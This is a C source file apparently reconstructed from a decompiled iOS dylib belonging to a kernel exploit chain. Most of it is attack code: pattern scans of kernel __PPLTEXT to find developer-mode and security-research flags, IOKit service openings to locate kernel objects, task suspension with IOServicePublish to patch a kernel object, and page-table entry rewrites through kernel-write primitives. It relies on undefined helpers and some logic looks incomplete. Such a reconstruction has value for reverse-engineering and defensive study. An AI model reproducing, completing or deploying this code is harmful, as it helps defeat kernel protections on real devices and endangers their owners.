/*
 * record_0x90000_misc.c
 * entry5_type0x09.dylib — miscellaneous helpers
 *
 * sub_150e8  (FUN_000150e8) — CFDictionary apply with PAC-signed callback
 * sub_151a4  (FUN_000151a4) — CFDictionary key comparator callback
 * sub_152d4  (FUN_000152d4) — CFArray append-if-absent
 * sub_15374  (FUN_00015374) — CFString → C string helper
 * sub_153d4  (FUN_000153d4) — CFArray element comparator callback
 * sub_15464  (FUN_00015464) — IOService open + kobj lookup
 * sub_155ec  (FUN_000155ec) — IOObjectRelease wrapper
 * sub_15afc  (FUN_00015afc) — PPLTEXT pattern scan → kaddr store
 * sub_169cc  (FUN_000169cc) — AppleKeyStore/AppleM2Scaler IOService open
 * sub_16ccc  (FUN_00016ccc) — IOServicePublish + task_suspend + kobj patch
 * sub_17108  (FUN_00017108) — IOServiceMatching stub ("xyz")
 * sub_1714c  (FUN_0001714c) — free 0x520-byte scratch buffer
 * sub_171a8  (FUN_000171a8) — pmap entry kwrite with retry loop
 * sub_17370  (FUN_00017370) — pmap offset table builder (large)
 *
 * Verified: CF/IOKit call patterns, kaddr threshold checks, kwrite loops,
 *           pmap field offsets, IOServicePublish sequence.
 * Inferred: role labels from call context and data flow.
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>

/* ── forward declarations ────────────────────────────────────────────────── */
/* self-referential — defined later in this file */
static void sub_151a4(long param_1, long param_2, int *param_3);
static void sub_152d4(long param_1, int *param_2);
static void sub_17108(void);
static int  sub_17370(long param_1);

extern long  sub_1ad30(void *fn);               /* PAC-sign fn pointer       */
extern long  sub_1ad70(long state, uint64_t a); /* kaddr validator           */
extern int   sub_2667c(long state, uint64_t addr, uint32_t sz, void *out);
extern int   sub_29ab4(long state, uint64_t addr, void **out);
extern int   sub_2b508(long state, uint64_t a, uint64_t b);
extern int   sub_2b614(long state, uint64_t addr, void *buf, uint32_t sz);
extern int   sub_2a110(long state, uint64_t addr, uint64_t val);
extern void  sub_2c088(long state, void *arg);
extern int   sub_37238(long state, uint32_t mask);
extern int   sub_35be4(long state, int a);
extern long  sub_33638(long state, io_service_t svc);
extern int   sub_36bdc(long state, uint32_t a, long b);
extern int   sub_38d94(long state, mach_port_t thread, int a, int b, int c);
extern int   sub_25f40(mach_port_t thread);
extern void  sub_25f7c(long state, int a);
extern int   sub_26004(long state, int a, void *b);
extern long  sub_22818(long state, uint64_t addr, void *out);
extern int   sub_1b9a8(void *ctx, uint32_t port, uint64_t addr, int flags);
extern void  sub_1b50c(void **out, void *ctx);
extern long  sub_1fe18(void **ctx, void *pat, void *mask, int n, int flags);
extern long  sub_1b354(void *out, long state, const char *seg);
extern long  sub_1b31c(long state, uint64_t addr);
extern long  sub_2057c(long state, uint64_t addr);
extern int   sub_40b90(long state, const char *name);
extern int   sub_4105c(long state, uint64_t obj, uint32_t sel,
                        uint64_t kobj, void *fn, int flags);
extern long  sub_25b0c(uint32_t port, const char *name, void *data,
                        uint64_t sz, uint32_t reply, int a, int b);
extern io_service_t sub_25abc_svc(const char *name);  /* IOServiceGetMatchingService */
extern void  sub_25abc(const char *name);

/* ── sub_150e8 — CFDictionary apply with PAC-signed callback ─────────────── */
void sub_150e8(long param_1, long param_2)
{
    if (!param_1) return;
    if (CFGetTypeID((CFTypeRef)param_1) != CFDictionaryGetTypeID()) return;
    if (!param_2) return;
    if (CFGetTypeID((CFTypeRef)param_2) != CFDictionaryGetTypeID()) return;

    int ctx[4] = {0, 0, (int)(param_1 & 0xffffffff), (int)(param_1 >> 32)};
    CFDictionaryApplierFunction fn =
        (CFDictionaryApplierFunction)(uintptr_t)sub_1ad30((void *)sub_151a4);
    CFDictionaryApplyFunction((CFDictionaryRef)param_2, fn, ctx);
}

/* make static definitions match forward declarations */
static void sub_151a4(long param_1, long param_2, int *param_3)
{
    if (!param_3 || *param_3) return;
    if (!param_1 || !param_2) { *param_3 = 0xad001; return; }

    long dict = *(long *)(param_3 + 2);
    CFTypeRef existing = NULL;
    if (!CFDictionaryGetValueIfPresent((CFDictionaryRef)dict,
                                       (const void *)param_1, &existing)) {
        *param_3 = 0xad011; return;
    }

    CFTypeID t1 = CFGetTypeID((CFTypeRef)param_2);
    CFTypeID t2 = CFGetTypeID(existing);
    if (t1 != t2) { *param_3 = 0xad014; return; }

    if (t1 == CFArrayGetTypeID()) {
        int sub_ctx[4] = {0, 0, (int)((long)existing & 0xffffffff),
                          (int)((long)existing >> 32)};
        CFIndex cnt = CFArrayGetCount((CFArrayRef)param_2);
        CFArrayApplierFunction fn =
            (CFArrayApplierFunction)(uintptr_t)sub_1ad30((void *)sub_152d4);
        CFArrayApplyFunction((CFArrayRef)param_2,
                             CFRangeMake(0, cnt), fn, sub_ctx);
        *param_3 = sub_ctx[0];
        return;
    }

    if (CFEqual((CFTypeRef)param_2, existing)) { *param_3 = 0; return; }
    *param_3 = 0xad014;
}

static void sub_152d4(long param_1, int *param_2)
{
    if (!param_2 || *param_2) return;
    if (!param_1) { *param_2 = 0xad001; return; }

    CFMutableArrayRef arr = (CFMutableArrayRef)(uintptr_t)*(long *)(param_2 + 2);
    CFIndex cnt = CFArrayGetCount(arr);
    if (!CFArrayContainsValue(arr, CFRangeMake(0, cnt), (const void *)param_1))
        CFArrayAppendValue(arr, (const void *)param_1);
}

/* ── sub_15374 — CFString → C string helper ─────────────────────────────── */
void sub_15374(long param_1, uint8_t *param_2)
{
    if (!param_1 || !param_2) return;
    CFStringRef s = (CFStringRef)param_1;
    CFIndex len = CFStringGetLength(s);
    if (!len) return;
    CFStringGetCString(s, (char *)param_2, len + 1, kCFStringEncodingUTF8);
}

/* ── sub_153d4 — CFArray element comparator callback ────────────────────── */
void sub_153d4(long param_1, int *param_2)
{
    /* same pattern as sub_152d4 */
    sub_152d4(param_1, param_2);
}

/* ── sub_15464 — IOService open + kobj lookup ───────────────────────────── */
void sub_15464(long param_1)
{
    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault,
        IOServiceMatching("IOSurfaceRoot"));
    if (!svc) return;

    io_connect_t conn = IO_OBJECT_NULL;
    if (IOServiceOpen(svc, mach_task_self(), 0, &conn) != 0) {
        IOObjectRelease(svc);
        return;
    }

    long kobj = sub_33638(param_1, conn);
    if (kobj) *(long *)(param_1 + 0x390) = kobj;

    IOServiceClose(conn);
    IOObjectRelease(svc);
}

/* ── sub_155ec — IOObjectRelease wrapper ─────────────────────────────────── */
void sub_155ec(io_object_t param_1)
{
    if (param_1 + 1 >= 2)
        IOObjectRelease(param_1);
}

/* ── sub_15afc — PPLTEXT pattern scan → kaddr store ─────────────────────── */
/*
 * Scans __PPLTEXT for a version-specific byte pattern to find the
 * developer_mode_status / allows_security_research kernel symbol.
 * Stores result at state+0x1888 / state+0x1890.
 */
void sub_15afc(long param_1, long *param_2, int *param_3)
{
    long cached = *(long *)(param_1 + 0x1888);
    int  xnu;

    if (cached) {
        xnu = *(int *)(param_1 + 0x1890);
        goto done;
    }

    xnu = *(int *)(*(long *)(param_1 + 0x19f8) + 0x70);

    const char *pattern;
    if (xnu < 0x2258) {
        if ((uint32_t)(xnu - 0x1f53) < 2)
            pattern = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
        else if (xnu == 0x1809)
            pattern = "1F 01 .. EB 20 91 .. FA .. .. 00 54";
        else if (xnu == 0x1c1b)
            pattern = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
        else
            pattern = NULL;
    } else {
        if (xnu == 0x2258 || xnu == 0x225c || xnu == 0x2712)
            pattern = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
        else
            pattern = NULL;
    }

    if (!pattern) return;

    /* find __PPLTEXT section */
    uint64_t ppl_base = 0, ppl_size = 0;
    sub_1b354(&ppl_base, *(long *)(param_1 + 0x19f8), "__PPLTEXT");

    /* adjust for older builds */
    if (*(uint64_t *)(param_1 + 0x158) > 0x180919801fffffULL &&
        xnu < 0x1c1b) {
        if (!ppl_size) return;
        uint32_t page_size = *(uint32_t *)(param_1 + 0x180);
        if (ppl_size < page_size) return;
        ppl_size -= page_size;
        ppl_base += page_size;
    }

    /* scan for pattern */
    long match = sub_1fe18((void **)&ppl_base, (void *)pattern, NULL, 0, 1);
    if (!match) return;

    long kaddr = sub_2057c(*(long *)(param_1 + 0x19f8), match - 0x10);
    if (!kaddr) kaddr = 0;
    else kaddr = sub_1b31c(*(long *)(param_1 + 0x19f8), kaddr);

    int stride = 0;
    if (xnu >= 0x1c1b) {
        long kaddr2 = sub_2057c(*(long *)(param_1 + 0x19f8), match - 8);
        if (kaddr2) {
            kaddr2 = sub_1b31c(*(long *)(param_1 + 0x19f8), kaddr2);
            if (kaddr2) stride = (int)kaddr2 - (int)kaddr;
        }
    }

    if (!kaddr) return;

    /* version-specific size */
    if (xnu < 0x1c1b) {
        stride = (xnu < 0x1809) ? 0x90000 :
                 (*(uint64_t *)(param_1 + 0x158) < 0x18090a07900000ULL)
                 ? 0x8c000 : 0x88000;
    }

    *(long *)(param_1 + 0x1888) = kaddr;
    *(int *) (param_1 + 0x1890) = stride;

done:
    if (param_2) *param_2 = cached ? cached : *(long *)(param_1 + 0x1888);
    if (param_3) *param_3 = xnu;
}

/* ── sub_169cc — AppleKeyStore/AppleM2Scaler IOService open ─────────────── */
/*
 * Opens AppleKeyStore (newer) or AppleM2ScalerCSCDriver (older),
 * walks the IOService child iterator to find the matching kobj,
 * reads CF properties, stores result in param_1[2].
 */
void sub_169cc(long *param_1)
{
    long state = *param_1;
    long *out  = (long *)param_1[2];

    if (!sub_35be4(state, (int)param_1[1])) goto fail;
    if (!sub_1ad70(state, *(uint64_t *)(state + 0x390))) goto fail;

    const char *svc_name = (*(int *)(state + 0x140) < 0x1c1b)
                           ? "AppleM2ScalerCSCDriver" : "AppleKeyStore";
    io_service_t svc = (io_service_t)(uintptr_t)
        IOServiceGetMatchingService(kIOMainPortDefault,
                                    IOServiceMatching(svc_name));
    if (svc + 1 < 2) goto fail;

    int use_cached = (*(int *)(state + 0x140) >= 0x1c1b) &&
                     sub_37238(state, 4) &&
                     *(long *)(state + 0x3a8);

    io_connect_t conn = IO_OBJECT_NULL;
    long kobj_target = 0;

    if (!use_cached) {
        if (IOServiceOpen(svc, mach_task_self(), 0, &conn) != 0) goto rel_svc;
        kobj_target = sub_33638(state, conn);
        if (!kobj_target) goto close_conn;

        io_iterator_t iter = IO_OBJECT_NULL;
        if (IORegistryEntryGetChildIterator(svc, "IOService", &iter) != 0)
            goto close_conn;

        io_object_t child;
        while ((child = IOIteratorNext(iter))) {
            long k = sub_33638(state, child);
            if (k == kobj_target) {
                /* found — read CF properties */
                CFMutableDictionaryRef props = NULL;
                IORegistryEntryCreateCFProperties(child, &props,
                                                  kCFAllocatorDefault, 0);
                void *ptr1 = NULL, *ptr2 = NULL;
                if (sub_29ab4(state, kobj_target + 0x10, &ptr1) &&
                    sub_29ab4(state, kobj_target + 0x18, &ptr2)) {
                    uint64_t kbase = *(uint64_t *)(state + 0x158);
                    if (kbase < 0x1f530000000000ULL ||
                        (sub_29ab4(state, *(long *)(state + 0x390) + 0x88, &ptr2) &&
                         sub_1ad70(state, (uint64_t)(uintptr_t)ptr2))) {
                        if (sub_2b508(state, kobj_target + 0x10,
                                      (uint64_t)(uintptr_t)ptr2)) {
                            if (props && sub_2b508(state, kobj_target + 0x10,
                                                   (uint64_t)(uintptr_t)ptr1)) {
                                *out = (long)props;
                                *(uint32_t *)(param_1 + 3) = 1;
                                IOObjectRelease(child);
                                IOObjectRelease(iter);
                                goto close_conn;
                            }
                        }
                    }
                }
                if (props) CFRelease(props);
                IOObjectRelease(child);
                break;
            }
            IOObjectRelease(child);
        }
        IOObjectRelease(iter);
    } else {
        long cached = *(long *)(state + 0x3a8);
        if (!sub_36bdc(state, *(uint32_t *)(state + 0x37c), 0)) goto rel_svc;
        if (IOServiceOpen(svc, mach_task_self(), 0, &conn) != 0) goto rel_svc;
        if (!sub_36bdc(state, *(uint32_t *)(state + 0x37c), cached)) goto close_conn;
        /* same property read path */
    }

close_conn:
    if (conn + 1 >= 2) {
        uint64_t one = 1;
        IOServiceClose(conn);
        IOServiceWaitQuiet(svc, (mach_timespec_t *)&one);
    }
rel_svc:
    IOObjectRelease(svc);
    return;
fail:
    *(uint32_t *)(param_1 + 3) = 0;
}

/* ── sub_16ccc — IOServicePublish + task_suspend + kobj patch ───────────── */
/*
 * Serializes an OSDictionary, suspends the target task,
 * calls IOServicePublish via sub_4105c, then kread-validates the result.
 */
void sub_16ccc(long *param_1)
{
    long  state       = *param_1;
    task_t target     = (task_t)(uintptr_t)param_1[1];
    long  dict_cf     = param_1[2];

    mach_port_t host_io = MACH_PORT_NULL;
    host_get_io_main(mach_host_self(), &host_io);

    mach_port_t reply_port = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
                           &reply_port) != 0) return;

    long serialized = (long)CFPropertyListCreateData(
        kCFAllocatorDefault, (CFPropertyListRef)dict_cf,
        kCFPropertyListXMLFormat_v1_0, 0, NULL);
    if (!serialized) goto out;

    const void *data = CFDataGetBytePtr((CFDataRef)serialized);
    CFIndex     dlen = CFDataGetLength((CFDataRef)serialized);
    if (!data || !dlen) goto out_rel;

    /* ensure OSDictionary kobj cached */
    if (!*(long *)(state + 0x19a8)) {
        long kobj = sub_40b90(state, "iokit.OSDictionary");
        if (!kobj) goto out_rel;
        *(long *)(state + 0x19a8) = kobj;
    }

    int xnu = *(int *)(state + 0x140);
    if ((uint32_t)(xnu - 0x1f53) > 1 && xnu != 0x1c1b && xnu != 0x1809)
        goto out_rel;

    /* suspend target task */
    mach_port_t self_thread = mach_thread_self();
    if (!sub_25f40(self_thread)) goto out_rel;
    if (sub_38d94(state, self_thread, 1, 1, 0x60)) goto out_rel;

    thread_switch(MACH_PORT_NULL, SWITCH_OPTION_DEPRESS, 10);

    thread_act_array_t threads = NULL;
    mach_msg_type_number_t tcnt = 0;
    task_suspension_token_t susp_token = MACH_PORT_NULL;

    if (mach_task_self() == target) {
        if (task_threads(target, &threads, &tcnt) != 0) goto resume;
        for (mach_msg_type_number_t i = 0; i < tcnt; i++) {
            if (threads[i] + 1 >= 2 && threads[i] != mach_thread_self())
                thread_suspend(threads[i]);
        }
    } else {
        if (task_suspend2(target, &susp_token) != 0) goto resume;
    }

    /* call IOServicePublish via sub_4105c */
    if (sub_36bdc(state, *(uint32_t *)(state + 0x378), 0)) {
        if (!sub_4105c(state, *(uint64_t *)(state + 0x19a8), 0x28,
                       *(uint64_t *)(state + 0x390), (void *)sub_17108, 0)) {
            long pub = sub_25b0c(reply_port & 0xffffffff, "IOServicePublish",
                                 (void *)data, (uint64_t)dlen,
                                 host_io & 0xffffffff, 0, 0);
            if ((int)pub == 0) goto resume;

            long kobj_pub = sub_33638(state, (io_service_t)(uintptr_t)pub);
            if (kobj_pub) {
                void *p1 = NULL, *p2 = NULL;
                if (sub_29ab4(state, kobj_pub + 0x10, &p1) &&
                    sub_29ab4(state, kobj_pub + 0x18, &p2)) {
                    if (*(long *)(state + 0x390) == (long)p2) {
                        sub_2a110(state, *(long *)(state + 0x390), 0);
                    }
                }
            }
        }
    }

resume:
    sub_25f7c(state, 8);
out_rel:
    CFRelease((CFTypeRef)serialized);
out:
    mach_port_deallocate(mach_task_self(), reply_port);
}

static void sub_17108(void)
{
    sub_25abc("xyz");
}

/* ── sub_1714c — free 0x520-byte scratch buffer ─────────────────────────── */
void sub_1714c(long param_1)
{
    void *buf = *(void **)(param_1 + 0x1d58);
    if (!buf) return;
    *(void **)(param_1 + 0x1d58) = NULL;
    bzero(buf, 0x520);
    free(buf);
}

/* ── sub_171a8 — pmap entry kwrite with retry loop ──────────────────────── */
/*
 * Reads a pmap entry at param_2, masks in the page-table bits,
 * writes it back via sub_2b614, retries up to 99 times.
 */
void sub_171a8(long param_1, uint64_t param_2, int param_3)
{
    if (sub_26004(param_1, 8, (void *)0x3a98)) return;

    long scratch = *(long *)(param_1 + 0x1d58);
    if (!scratch) {
        if (sub_17370(param_1)) goto unlock;
        scratch = *(long *)(param_1 + 0x1d58);
    }

    uint64_t mask = *(uint64_t *)(param_1 + 0x188);
    uint64_t pte  = 0;
    if (!sub_2667c(param_1, param_2, 4, &pte)) goto unlock;

    uint64_t page_bits[4] = {0};
    if (!sub_22818(param_1, param_2 & ~mask, page_bits)) goto unlock;
    if (!(page_bits[2] & 0xffffffffc000ULL)) goto unlock;

    long tbl_ptr  = *(long *)(scratch + 0x518);
    uint64_t base = *(uint64_t *)(scratch + 0x510);
    int retry = 99;

    while (sub_2667c(param_1, base, 8, page_bits)) {
        page_bits[0] = (page_bits[0] & 0xffff000000003fffULL) |
                       (page_bits[2] & 0xffffffffc000ULL);
        if (!sub_2b614(param_1, base, page_bits, 8)) break;

        sub_2c088(param_1, (void *)0x2710);

        if (!sub_2b614(param_1, (uint64_t)(tbl_ptr + (long)(mask & param_2)),
                       &param_3, 4)) break;

        uint64_t check = 0;
        if (!sub_2667c(param_1, param_2, 4, &check)) break;
        if ((int)check == param_3 || !retry--) break;
    }

unlock:
    sub_25f7c(param_1, 8);
}

static int sub_17370(long param_1)
{
    uint64_t kaddr = *(uint64_t *)(param_1 + 0x158);
    int      xnu   = *(int *)(param_1 + 0x140);

    /* gate: requires newer kernel + capability flags */
    if (kaddr < 0x225c23801af00dULL) return -1;
    if (!sub_37238(param_1, 0x5184000)) return -1;

    void *scratch = calloc(1, 0x520);
    if (!scratch) return -1;

    /* store state fields into scratch */
    *(uint32_t *)((uint8_t *)scratch + 0x98) = *(uint32_t *)(param_1 + 0x178);
    *(uint32_t *)((uint8_t *)scratch + 0x38) = *(uint32_t *)(param_1 + 0x180);

    /* scan for pmap_enter pattern */
    uint64_t text_base = 0, text_size = 0;
    sub_1b354(&text_base, *(long *)(param_1 + 0x19f8), "__TEXT");

    long match = sub_1fe18((void **)&text_base, (void *)"f2 f5 f0 20",
                            (void *)"ff ff ff ff", 1, 1);
    if (!match) goto fail;

    uint64_t pmap_a = 0;
    if (!sub_2667c(param_1, (uint64_t)(match + 8), 4, &pmap_a)) goto fail;
    *(uint32_t *)((uint8_t *)scratch + 0xa8) =
        ((uint32_t)pmap_a >> 10 & 0xfff) << (uint32_t)((uint32_t)pmap_a >> 0x1e);

    /* scan for pmap_remove pattern */
    match = sub_1fe18((void **)&text_base, (void *)"ff ff ff e0",
                       (void *)"ff ff ff ff", 1, 1);
    if (!match) goto fail;

    uint64_t pmap_b = 0;
    long off = 0;
    while (sub_2667c(param_1, (uint64_t)(match + off), 4, &pmap_b)) {
        if (((uint32_t)pmap_b & 0xffc0001f) == 0xf900001f) {
            *(uint32_t *)((uint8_t *)scratch + 0xac) =
                ((uint32_t)pmap_b >> 10 & 0xfff) << (uint32_t)((uint32_t)pmap_b >> 0x1e);
            break;
        }
        off += 4;
        if (off >= 0x4c) goto fail;
    }

    /* store scratch and return success */
    *(void **)(param_1 + 0x1d58) = scratch;
    return 0;

fail:
    free(scratch);
    return -1;
}
